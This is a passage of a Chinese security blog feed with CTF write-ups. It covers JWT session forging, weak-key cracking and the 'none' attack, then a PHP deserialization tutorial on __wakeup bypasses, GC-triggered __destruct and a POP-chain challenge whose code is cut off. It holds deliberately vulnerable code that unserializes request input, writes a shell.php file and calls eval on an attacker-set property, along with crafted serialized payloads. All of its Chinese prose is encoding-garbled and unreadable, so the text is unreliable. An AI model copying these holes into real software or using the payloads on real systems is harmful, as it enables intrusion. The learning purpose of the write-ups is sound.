src="https://pic1.imgdb.cn/item/6958783c912e73dbe6128c0f.png"></p><h3 id="CTFshow-æŠ½è€å©†"><a href="#CTFshow-æŠ½è€å©†" class="headerlink" title="[CTFshow] æŠ½è€å©†"></a>[CTFshow] æŠ½è€å©†</h3><p>ä¸‹è½½å›¾ç‰‡å‘ç°downloadåé—¨</p><p><img src="https://pic1.imgdb.cn/item/6958b179da3df73ea1bbfd4e.png"></p><p>ä»”ç»†è§‚å¯Ÿå‘ç°æ˜¯python flaskæ¡†æ¶ï¼Œå°è¯•ä¸‹è½½app.pyï¼ŒæˆåŠŸ</p><p>å®¡è®¡ä»£ç å‘ç°&#x2F;secret_path_U_never_knowè·¯å¾„ï¼Œä½†æ˜¯è¿˜éœ€è¦ç»•è¿‡èº«ä»½éªŒè¯</p><p>åªéœ€è¦è®©sessionä¸­çš„isadminä¸ºçœŸå°±å¯ï¼Œè¿™ä¸ªç”¨çš„æ˜¯JWTæ–¹å¼è®¤è¯ï¼Œå°†isadminçš„å€¼æ›´æ”¹åï¼Œä½¿ç”¨å¯†é’¥SECRET_KEYé‡æ–°åŠ å¯†ç”Ÿæˆä¸€ä¸ªsessionã€‚</p><p><img src="https://pic1.imgdb.cn/item/6958b210da3df73ea1bbfe7b.png"></p><p>ä½¿ç”¨hackbarä¼ å…¥å³å¯</p><h3 id="CTFHub-å¼±ç­¾å"><a href="#CTFHub-å¼±ç­¾å" class="headerlink" title="[CTFHub]å¼±ç­¾å"></a>[CTFHub]å¼±ç­¾å</h3><p>å¦‚æœJWTé‡‡ç”¨å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œå¹¶ä¸”å¯†é’¥çš„å¼ºåº¦è¾ƒå¼±çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡è›®åŠ›æ”»å‡»æ–¹å¼æ¥ç ´è§£å¯†é’¥</p><p><a href="https://www.cnblogs.com/litluo/p/c-jwt-cracker.html">å¿«é€Ÿå®‰è£… c-jwt-cracker</a></p><p><img src="https://pic1.imgdb.cn/item/695a32c4bee82fbf891bf50f.png"></p><p>ç”±æ­¤æˆ‘ä»¬ä¾¿å¾—åˆ°äº†å¯†é’¥hnqx</p><h3 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h3><p>1.å¦‚ä½•åˆ¤æ–­ç­¾åæ ¡éªŒ</p><p>åœ¨Jwt_password_managerä¸­ï¼Œæœ‰ä¸€ä¸ªæ ¡éªŒç­¾åçš„å‡½æ•°ï¼Œå¹¶ä¸”åœ¨ç”¨æˆ·åèµ‹å€¼æ—¶è°ƒç”¨äº†æ ¡éªŒå‡½æ•°</p><p><img src="https://pic1.imgdb.cn/item/695a2ed9bee82fbf891bf308.png"></p><p>ä½†æ˜¯åœ¨no_jwtä¸­ä¸è¿›è¡Œç­¾åéªŒè¯å’Œè¿‡æœŸéªŒè¯ï¼Œä»…å¯¹ JWT ä»¤ç‰Œè¿›è¡Œè§£ç </p><p><img src="https://pic1.imgdb.cn/item/695a2fccbee82fbf891bf386.png"></p><p>å› æ­¤å¯ä»¥ä½¿ç”¨noneæ”»å‡»</p><p>2.å¦‚ä½•åˆ¤æ–­ç½‘ç«™æ˜¯pythonå†™çš„</p><ul><li>æŸ¥çœ‹è¯·æ±‚å¤´çš„serverä¿¡æ¯</li><li>çœ‹ç½‘ç«™åç¼€å</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PHPååºåˆ—åŒ–æ¼æ´</title>
    <link href="/2025/12/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/12/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="PHPååºåˆ—åŒ–æ¼æ´"><a href="#PHPååºåˆ—åŒ–æ¼æ´" class="headerlink" title="PHPååºåˆ—åŒ–æ¼æ´"></a>PHPååºåˆ—åŒ–æ¼æ´</h1><h2 id="1-åŸºç¡€è¯­æ³•"><a href="#1-åŸºç¡€è¯­æ³•" class="headerlink" title="1.åŸºç¡€è¯­æ³•"></a>1.åŸºç¡€è¯­æ³•</h2><h3 id="1-1-é¢å‘å¯¹è±¡"><a href="#1-1-é¢å‘å¯¹è±¡" class="headerlink" title="1.1 é¢å‘å¯¹è±¡"></a>1.1 é¢å‘å¯¹è±¡</h3><p><strong>å¯¹è±¡å®ä¾‹åŒ–</strong>ï¼š<code>$å¯¹è±¡å = new ç±»å();</code></p><p><strong>è®¿é—®æˆå‘˜</strong></p><ul><li>æˆå‘˜æ–¹æ³•ï¼š<code>$å¯¹è±¡å-&gt;æˆå‘˜æ–¹æ³•å();</code></li><li>æˆå‘˜å˜é‡ï¼š<code>$å¯¹è±¡å-&gt;æˆå‘˜å˜é‡å;</code></li></ul><p><strong><code>$this</code> å…³é”®å­—</strong>ï¼šåœ¨ç±»å†…éƒ¨è°ƒç”¨æœ¬ç±»çš„æˆå‘˜å˜é‡ &#x2F; æ–¹æ³•æ—¶ä½¿ç”¨ï¼Œå¦‚ <code>$this-&gt;å˜é‡å</code>&#x2F;<code>$this-&gt;æ–¹æ³•å()</code>ã€‚</p><h3 id="1-2-åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#1-2-åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="1.2 åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>1.2 åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h3><p>åºåˆ—åŒ–æ˜¯å°†å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯ï¼ˆå±æ€§ï¼‰è½¬æ¢ä¸ºå¯ä»¥å­˜å‚¨æˆ–ä¼ è¾“çš„å½¢å¼çš„è¿‡ç¨‹ã€‚</p><p>å¯¹è±¡â€”â€”(åºåˆ—åŒ–)â€”â€”-&gt;å­—ç¬¦ä¸²</p><p>å°†åºåˆ—åŒ–åçš„å‚æ•°è¿˜åŸä¸ºå®ä¾‹åŒ–çš„å¯¹è±¡</p><p>å¯¹è±¡&lt;â€”â€”(ååºåˆ—åŒ–)â€”â€”-å­—ç¬¦ä¸²</p><p>ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œunserializeæ¥å—çš„å€¼ï¼ˆå­—ç¬¦ä¸²ï¼‰å¯æ§ï¼›æ›´æ”¹è¿™ä¸ªå€¼ï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼Œå¾—åˆ°æ‰€éœ€è¦çš„ä»£ç ï¼Œå³ç”Ÿæˆçš„å¯¹è±¡çš„å±æ€§</p><h2 id="2-é­”æœ¯æ–¹æ³•"><a href="#2-é­”æœ¯æ–¹æ³•" class="headerlink" title="2.é­”æœ¯æ–¹æ³•"></a>2.é­”æœ¯æ–¹æ³•</h2><p>é­”æœ¯æ–¹æ³•æ˜¯ PHP é¢„å®šä¹‰çš„ç‰¹æ®Šæ–¹æ³•ï¼Œä»¥åŒä¸‹åˆ’çº¿<code>__</code>å¼€å¤´ï¼Œæ»¡è¶³æ¡ä»¶æ—¶è‡ªåŠ¨è§¦å‘ã€‚</p><p><code>__construct()</code></p><ul><li>è§¦å‘æ—¶æœºï¼šåˆ›å»ºå¯¹è±¡ï¼ˆå®ä¾‹åŒ–ç±»ï¼‰æ—¶è‡ªåŠ¨æ‰§è¡Œã€‚</li><li>ä½œç”¨ï¼šåˆå§‹åŒ–å¯¹è±¡çš„å±æ€§ã€èµ„æºç­‰ã€‚</li></ul><p><code>__destruct()</code></p><ul><li>è§¦å‘æ—¶æœºï¼šå¯¹è±¡è¢«é”€æ¯ï¼ˆè„šæœ¬ç»“æŸ &#x2F; ä¸»åŠ¨ unsetï¼‰æ—¶è‡ªåŠ¨æ‰§è¡Œã€‚</li><li>ä½œç”¨ï¼šé‡Šæ”¾èµ„æºï¼ˆå¦‚å…³é—­æ•°æ®åº“è¿æ¥ã€æ–‡ä»¶å¥æŸ„ï¼‰ã€‚</li></ul><p><code>__clone()</code></p><ul><li>è§¦å‘æ—¶æœºï¼šä½¿ç”¨<code>clone</code>å…³é”®å­—å¤åˆ¶å¯¹è±¡æ—¶æ‰§è¡Œã€‚</li><li>ä½œç”¨ï¼šè‡ªå®šä¹‰å¯¹è±¡å…‹éš†çš„è¡Œä¸ºï¼Œé¿å…æµ…æ‹·è´é—®é¢˜ã€‚</li></ul><p><strong><code>__set()</code></strong></p><ul><li>è§¦å‘æ—¶æœºï¼šå°è¯•ç»™<strong>ä¸å¯è®¿é—® &#x2F; ä¸å­˜åœ¨</strong>çš„æˆå‘˜å˜é‡èµ‹å€¼æ—¶è§¦å‘ã€‚</li><li>è¯­æ³•ï¼š<code>public function __set($name, $value) &#123;&#125;</code>ï¼ˆä¸ºå˜é‡åï¼Œvalue ä¸ºèµ‹å€¼å†…å®¹ï¼‰ã€‚</li></ul><p><strong><code>__get()</code></strong></p><ul><li>è§¦å‘æ—¶æœºï¼šå°è¯•è·å–<strong>ä¸å¯è®¿é—® &#x2F; ä¸å­˜åœ¨</strong>çš„æˆå‘˜å˜é‡å€¼æ—¶è§¦å‘ã€‚</li><li>è¯­æ³•ï¼š<code>public function __get($name) &#123;&#125;</code>ï¼ˆ$name ä¸ºå˜é‡åï¼‰ã€‚</li></ul><p><strong><code>__call()</code></strong></p><ul><li>è§¦å‘æ—¶æœºï¼šè°ƒç”¨ **ä¸å­˜åœ¨ &#x2F; ä¸å¯è®¿é—®ï¼ˆprotected&#x2F;privateï¼‰**çš„éé™æ€æ–¹æ³•æ—¶è§¦å‘ã€‚</li><li>è¯­æ³•ï¼š<code>public function __call($method, $args) &#123;&#125;</code>ï¼ˆmethodä¸ºæ–¹æ³•åï¼Œargs ä¸ºæ–¹æ³•å‚æ•°æ•°ç»„ï¼‰ã€‚</li></ul><p><strong><code>__callStatic()</code></strong></p><ul><li>è§¦å‘æ—¶æœºï¼šè°ƒç”¨<strong>ä¸å­˜åœ¨ &#x2F; ä¸å¯è®¿é—®</strong>çš„é™æ€æ–¹æ³•æ—¶è§¦å‘ã€‚</li><li>è¯­æ³•ï¼š<code>public static function __callStatic($method, $args) &#123;&#125;</code>ã€‚</li></ul><p><strong><code>__toString()</code></strong></p><ul><li>è§¦å‘æ—¶æœºï¼šå°†å¯¹è±¡å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨ï¼ˆå¦‚ echoã€æ‹¼æ¥å­—ç¬¦ä¸²ï¼‰æ—¶è§¦å‘ã€‚</li><li>è¯­æ³•ï¼š<code>public function __toString() &#123; return &quot;å­—ç¬¦ä¸²å†…å®¹&quot;; &#125;</code>ï¼Œå¿…é¡»è¿”å›å­—ç¬¦ä¸²ï¼Œå¦åˆ™æŠ¥é”™ã€‚</li></ul><p><strong><code>__sleep()</code></strong></p><ul><li>è§¦å‘æ—¶æœºï¼šæ‰§è¡Œ<code>serialize()</code>åºåˆ—åŒ–å¯¹è±¡æ—¶è§¦å‘ã€‚</li><li>ä½œç”¨ï¼šæŒ‡å®šåºåˆ—åŒ–æ—¶éœ€è¦ä¿å­˜çš„æˆå‘˜å˜é‡ï¼Œè¿”å›å€¼ä¸ºæ•°ç»„ï¼ˆåŒ…å«è¦åºåˆ—åŒ–çš„å˜é‡åï¼‰ã€‚</li><li>è¯­æ³•ï¼š<code>public function __sleep() &#123; return [&#39;var1&#39;, &#39;var2&#39;]; &#125;</code>ã€‚</li></ul><p><strong><code>__wakeup()</code></strong></p><ul><li>è§¦å‘æ—¶æœºï¼šæ‰§è¡Œ<code>unserialize()</code>ååºåˆ—åŒ–å¯¹è±¡æ—¶è§¦å‘ã€‚</li><li>ä½œç”¨ï¼šååºåˆ—åŒ–åæ¢å¤å¯¹è±¡çš„çŠ¶æ€ï¼ˆå¦‚é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥ï¼‰ã€‚</li><li>è¯­æ³•ï¼š<code>public function __wakeup() &#123;&#125;</code>ã€‚</li></ul><p><img src="https://pic1.imgdb.cn/item/695080d1161224305eb310dc.png"></p><p><img src="https://pic1.imgdb.cn/item/695080ec161224305eb310dd.png"></p><h2 id="3-wake-upç»•è¿‡"><a href="#3-wake-upç»•è¿‡" class="headerlink" title="3.__wake-upç»•è¿‡"></a>3.__wake-upç»•è¿‡</h2><h3 id="3-1-ä¿®æ”¹å¯¹è±¡å±æ€§ä¸ªæ•°"><a href="#3-1-ä¿®æ”¹å¯¹è±¡å±æ€§ä¸ªæ•°" class="headerlink" title="3.1 ä¿®æ”¹å¯¹è±¡å±æ€§ä¸ªæ•°"></a>3.1 ä¿®æ”¹å¯¹è±¡å±æ€§ä¸ªæ•°</h3><ul><li>PHP5 &lt; 5.6.25</li><li>PHP7 &lt; 7.0.10</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;test&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;target = <span class="hljs-string">&quot;wakeup!&quot;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;C:\\phpstudy_pro\\WWW\\unserialize\\shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$this</span>-&gt;target);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>&#125;<br>&#125;<br> <br><span class="hljs-variable">$test</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-variable">$test_unseria</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$test</span>);<br> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;shell.php&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;.\shell.php&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>unserialize( )ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ªwakeup( )æ–¹æ³•ã€‚æœ¬ä¾‹ä¸­å­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨_wakeup()æ–¹æ³•ï¼Œé¢„å…ˆå°†å¯¹è±¡ä¸­çš„targetå±æ€§èµ‹å€¼ä¸ºâ€wakeup!â€ã€‚æ‰€ä»¥æˆ‘ä»¬æƒ³ç»•__ wakeupå‡½æ•°ï¼Œå¯ä»¥ä¿®æ”¹åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼ï¼Œä¿®æ”¹ä¸ºå¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°å°±ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚</p><h3 id="3-2-phpå¼•ç”¨èµ‹å€¼"><a href="#3-2-phpå¼•ç”¨èµ‹å€¼" class="headerlink" title="3.2 phpå¼•ç”¨èµ‹å€¼"></a>3.2 phpå¼•ç”¨èµ‹å€¼</h3><p>åœ¨phpé‡Œï¼Œæˆ‘ä»¬å¯ä½¿ç”¨å¼•ç”¨çš„æ–¹å¼è®©ä¸¤ä¸ªå˜é‡åŒæ—¶æŒ‡å‘åŒä¸€ä¸ªå†…å­˜åœ°å€ï¼Œè¿™æ ·å¯¹å…¶ä¸­ä¸€ä¸ªå˜é‡æ“ä½œæ—¶ï¼Œå¦ä¸€ä¸ªå˜é‡çš„å€¼ä¹Ÿä¼šéšä¹‹æ”¹å˜ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">&quot;hacker&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;end = <span class="hljs-variable language_">$this</span>-&gt;start;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨__wakeupä¸­æœ‰ä¸€ä¸ªèµ‹å€¼æ“ä½œï¼Œæˆ‘ä»¬åªéœ€è¦è®©endå’Œusernameäº’ç›¸å¼•ç”¨ï¼Œå°±å¯ä»¥ä¿®æ”¹usernameçš„å€¼ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>-&gt;end = &amp;<span class="hljs-variable">$a</span>-&gt;username;<br></code></pre></td></tr></table></figure><h3 id="3-3-php-GCå›æ”¶æœºåˆ¶"><a href="#3-3-php-GCå›æ”¶æœºåˆ¶" class="headerlink" title="3.3 php GCå›æ”¶æœºåˆ¶"></a>3.3 php GCå›æ”¶æœºåˆ¶</h3><p>åŸç†ï¼šå½“ <code>is_ref</code> å‡å°‘æ—¶ï¼Œä¼šè§¦å‘ <code>__destuct</code> é­”æœ¯æ–¹æ³•ï¼Œç”±æ­¤äº§ç”Ÿçš„ä¸€äº› trick ç±»å‹æ”»å‡»</p><p>å½“å¯¹è±¡ä¸º<code>NULL</code>æ—¶ä¹Ÿæ˜¯å¯ä»¥è§¦å‘<code>__destruct</code>çš„ã€‚</p><p>åœ¨ä¸€ä¸ª array é‡Œé¢å­˜åœ¨ä¸€ä¸ªé”®å€¼å¯¹ï¼Œvalue ä¸ºæŸä¸ªç±»ï¼Œå½“è¿™ä¸ªç±»ä¸º NULL çš„æ—¶å€™ï¼Œä¼šè¢«è®¤ä¸ºæ˜¯ <code>is_ref</code> ä¸º 0ï¼Œä¹Ÿå°±æ˜¯ falseã€‚è¿™å°±å¯ä»¥è§¦å‘åˆ° <code>__destruct</code> æ–¹æ³•</p><p>æ ·ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;test_flag&#125;&quot;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå› ä¸ºæœ‰å¼‚å¸¸å¤„ç†ï¼Œæ‰€ä»¥æ­£å¸¸æƒ…å†µä¸‹æ˜¯æ— æ³•<code>__destruct</code>ï¼Œè¿™æ—¶æˆ‘ä»¬å°±éœ€è¦åˆ©ç”¨GCå›æ”¶æœºåˆ¶æ¥è§¦å‘<code>__destruct</code>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>  &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-keyword">new</span> B,<span class="hljs-string">&#x27;b&#x27;</span>=&gt;<span class="hljs-literal">NULL</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">// a:2:&#123;s:1:&quot;a&quot;;O:1:&quot;B&quot;:0:&#123;&#125;s:1:&quot;b&quot;;N;&#125;</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°åºåˆ—åŒ–æ–‡æœ¬å¦‚ä¸‹</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;N;&#125;<br>å¯¹è±¡ç±»å‹:å¯¹è±¡ä¸ªæ•°:&#123;ç±»å‹:é•¿åº¦:é”®å;ç±»å‹:é•¿åº¦:ç±»å:å€¼ç±»å‹:é•¿åº¦:é”®å;ç±»å‹;&#125;<br>æ•°ç»„:å¯¹è±¡ä¸ªæ•°ä¸º<span class="hljs-number">2</span>:&#123;strå‹:é•¿åº¦<span class="hljs-number">1</span>:é”®åä¸º<span class="hljs-string">&quot;a&quot;</span>;ç±»:é•¿åº¦ä¸º<span class="hljs-number">1</span>:ç±»åä¸º<span class="hljs-string">&quot;B&quot;</span>:å€¼ä¸º<span class="hljs-number">0</span> strå‹:å€¼ä¸º<span class="hljs-number">1</span>:é”®åä¸º<span class="hljs-string">&quot;b&quot;</span>:NULLå‹;&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ—¶æˆ‘ä»¬å°†é”®å<code>b</code>æ”¹æˆ<code>a</code>ï¼Œå³åœ¨ååºåˆ—åŒ–æ—¶ï¼Œä¼šä¸‹å…ˆè®©<code>a</code>èµ‹å€¼ä¸ºç±»<code>B</code>ï¼Œä¹‹åå†å°†<code>a</code>èµ‹å€¼ä¸º<code>NULL</code>ï¼Œä½†ä¸€å¼€å§‹<code>a</code>å·²ç»æ˜¯å¯¹è±¡äº†ï¼Œèµ‹å€¼ä¸º<code>NULL</code>æ—¶å°±ä¼šå‡ºç°å¯¹è±¡ä¸º<code>NULL</code>çš„æƒ…å†µï¼Œä»è€Œè§¦å‘<code>__destruct</code>ã€‚</p><p>è¿˜æœ‰ä¸€ä½å¸ˆå‚…çš„åšæ³•æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> B,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure><p>å†ä¿®æ”¹i:1ä¸ºi:0 </p><h3 id="3-4-fast-destruct"><a href="#3-4-fast-destruct" class="headerlink" title="3.4 fast destruct"></a>3.4 fast destruct</h3><p>å‚è€ƒï¼š<a href="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">æ™¨æ›¦</a></p><h2 id="4-å®æˆ˜"><a href="#4-å®æˆ˜" class="headerlink" title="4.å®æˆ˜"></a>4.å®æˆ˜</h2><h3 id="4-1-BaseCTF2024-Really-EZ-POP"><a href="#4-1-BaseCTF2024-Really-EZ-POP" class="headerlink" title="4.1 [BaseCTF2024]Really EZ POP"></a>4.1 [BaseCTF2024]Really EZ POP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sink</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;echo 123;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shark</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$word</span> = <span class="hljs-string">&#x27;Hello, World!&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Shark says:&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;word;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sea</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$animal</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$sea_ani</span> = <span class="hljs-variable language_">$this</span>-&gt;animal;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="hljs-variable">$sea_ani</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Nature</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sea</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span 